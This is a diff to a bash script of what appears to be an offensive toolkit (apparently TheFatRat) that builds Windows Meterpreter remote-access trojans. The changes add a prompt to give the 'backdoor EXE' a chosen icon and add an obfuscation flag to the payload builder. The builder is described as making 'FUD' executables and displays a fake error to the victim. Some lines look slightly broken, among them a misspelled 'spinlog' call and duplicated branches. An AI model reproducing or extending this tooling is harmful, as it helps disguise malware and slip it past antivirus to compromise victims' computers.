@@ -1451,6 +1451,31 @@ case $fwin in
     then
     spinlong
     echo ""
+icfold="$path/icons"
+    lit=`ls -1 $icfold/*.ico 2>/dev/null | wc -l`
+    if [ $lit != 0 ]
+                  then
+echo -e $orange "  +--------------------+"
+echo -e $orange "  |$okegreen Current icons list$orange |"
+echo -e $orange "  +--------------------+"
+for liste in icons/*.ico; do
+                  echo ${liste##*/}
+    done
+    echo -e $orange "  +---------------------+"
+    echo ""
+    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE"
+    echo ""
+                  echo -ne "   Filename : ";tput sgr0
+                  read fname
+fi
+if [ -z $fname ]
+                  then
+    echo ""
+echo -e $red "No file name was written"
+echo ""
+ echo -e $okegreen "Building EXE with default icon"
+spinlong
+echo ""
     echo -e $red "[*] Builing your powerstage rat for windows with the following values"
     echo ""
     echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
@@ -1461,14 +1486,81 @@ case $fwin in
     echo
     echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
     sleep 4
-    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --output $fira >> $logfud 2>&1
+    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
     #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
     met="32"
     pstagef
+fi
+if [ ! -f $icfold/$fname ]
+then
+echo ""
+echo -e $red "The Filename you wrote does not exist in icons folder."
+echo ""
+ echo -e $okegreen "Building EXE with default icon"
+spinlong
+echo ""
+  echo -e $red "[*] Builing your powerstage rat for windows with the following values"
+echo ""
+    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
+    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
+    echo -e $yellow "  Your Port     :$okegreen $yourport"
+    echo -e $yellow "  Rat Filename  :$okegreen $fira"
+    fstager=$path/$fira
+    echo
+    echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
+    sleep 4
+    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    #Create a var with 32 = 32bit , so pstagef function know which listener configutation must be written (in case selected)
+    met="32"
+    pstagef
+else
+echo ""
+spinlong
+echo ""
+    echo -e $red "[*] Builing your powerstage rat for windows with the following values"
+    echo ""
+    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
+    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
+    echo -e $yellow "  Your Port     :$okegreen $yourport"
+    echo -e $yellow "  Rat Filename  :$okegreen $fira"
+    echo -e $yellow "  Icon filename :$okegreen $fname"
+    fstager=$path/$fira
+    echo
+    echo -e $red "[*] Starting the creation of your FUD 32bit Exe"
+python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
+met="32"
+    pstagef
+fi
 
 elif [ $choice == "2" ]
   then
-    spinlong
+echo ""
+spinlong
+echo ""
+icfold="$path/icons"
+    lit=`ls -1 $icfold/*.ico 2>/dev/null | wc -l`
+    if [ $lit != 0 ]
+                  then
+echo -e $orange "  +--------------------+"
+echo -e $orange "  |$okegreen Current icons list$orange |"
+echo -e $orange "  +--------------------+"
+for liste in icons/*.ico; do
+                  echo ${liste##*/}
+    done
+    echo -e $orange "  +---------------------+"
+    echo ""
+    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE"
+    echo ""
+                  echo -ne "   Filename : ";tput sgr0
+                  read fname
+fi
+if [ -z $fname ]
+                  then
+    echo ""
+echo -e $red "No file name was written"
+echo ""
+ echo -e $okegreen "Building EXE with default icon"
+spinlong
 echo ""
     echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
     echo ""
@@ -1477,20 +1569,81 @@ echo ""
     echo -e $yellow "  Your Port     :$okegreen $yourport"
     echo -e $yellow "  Rat Filename  :$okegreen $fira"
     fstager=$path/$fira
-    python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --output $fira >> $logfud 2>&1
+    python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
     #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
     met="64"
     pstagef
-
+fi
+if [ ! -f $icfold/$fname ]
+then
+echo ""
+echo -e $red "The Filename you wrote does not exist in icons folder."
+echo ""
+ echo -e $okegreen "Building EXE with default icon"
+spinlong
+    echo -e $red "[*] Builing your powerstager rat for windows with the following values"
+    echo ""
+echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
+    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
+    echo -e $yellow "  Your Port     :$okegreen $yourport"
+    echo -e $yellow "  Rat Filename  :$okegreen $fira"
+    fstager=$path/$fira
+    python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
+    met="64"
+    pstagef
+else
+echo ""
+spinlong
+echo ""
+    echo -e $red "[*] Builing your powerstage rat for windows with the following values"
+    echo ""
+    echo -e $yellow "  Target        :$okegreen Windows 64 Bit"
+    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
+    echo -e $yellow "  Your Port     :$okegreen $yourport"
+    echo -e $yellow "  Rat Filename  :$okegreen $fira"
+    echo -e $yellow "  Icon filename :$okegreen $fname"
+    fstager=$path/$fira
+    echo ""
+  python $pstager --target win64 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
+    #Create a var with 64 = 64bit , so pstagef function know which listener configutation must be written (in case selected)
+    met="64"
+    pstagef
+fi
     else
     fudwin
     fi
-    fi
+   fi
 # On this point , fatrat detected that there is no mingw64 installed , so will proceed automatically to rat 32bit creation
     which i586-mingw32msvc-gcc >> $logfud 2>&1
     if [ "$?" -eq "0" ]; then
     echo ""
     spinlong
+echo ""
+icfold="$path/icons"
+    lit=`ls -1 $icfold/*.ico 2>/dev/null | wc -l`
+    if [ $lit != 0 ]
+                  then
+echo -e $orange "  +--------------------+"
+echo -e $orange "  |$okegreen Current icons list$orange |"
+echo -e $orange "  +--------------------+"
+for liste in icons/*.ico; do
+                  echo ${liste##*/}
+    done
+    echo -e $orange "  +-------------------------+"
+    echo ""
+    echo -e $okegreen "  Write the icon name from the list to add to your backdoor EXE"
+    echo ""
+                  echo -ne "   Filename : ";tput sgr0
+                  read fname
+fi
+if [ -z $fname ]
+                  then
+    echo ""
+echo -e $red "No file name was written"
+echo ""
+ echo -e $okegreen "Building EXE with default icon"
+spinlong
 echo ""
     echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
     echo ""
@@ -1499,10 +1652,45 @@ echo ""
     echo -e $yellow "  Your Port     :$okegreen $yourport"
     echo -e $yellow "  Rat Filename  :$okegreen $fira"
     fstager="$path/$fira"
-    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --output $fira >> $logfud 2>&1
+    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
     met="32"
     pstagef
     fi
+if [ ! -f $icfold/$fname ]
+then
+echo ""
+echo -e $red "The Filename you wrote does not exist in icons folder."
+echo ""
+ echo -e $okegreen "Building EXE with default icon"
+spinlog
+echo ""
+echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
+    echo ""
+    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
+    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
+    echo -e $yellow "  Your Port     :$okegreen $yourport"
+    echo -e $yellow "  Rat Filename  :$okegreen $fira"
+    fstager="$path/$fira"
+    python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --output $fira >> $logfud 2>&1
+    met="32"
+    pstagef
+else
+spinlog
+echo ""
+echo -e $okegreen "[*] Builing your powerstage rat for windows with the following values"
+echo ""
+    echo -e $yellow "  Target        :$okegreen Windows 32 Bit"
+    echo -e $yellow "  Your IP/Host  :$okegreen $yourip"
+    echo -e $yellow "  Your Port     :$okegreen $yourport"
+    echo -e $yellow "  Rat Filename  :$okegreen $fira"
+    echo -e $yellow "  Icon filename :$okegreen $fname"
+    fstager=$path/$fira
+    echo ""
+  python $pstager --target win32 --meterpreter --lhost $yourip --lport $yourport --fake-error --obfuscation --icon $icfold/$fname --output $fira >> $logfud 2>&1
+    met="32"
+    pstagef
+fi
+fi
     ;;
 2)
 #slowbutpowerfull selection
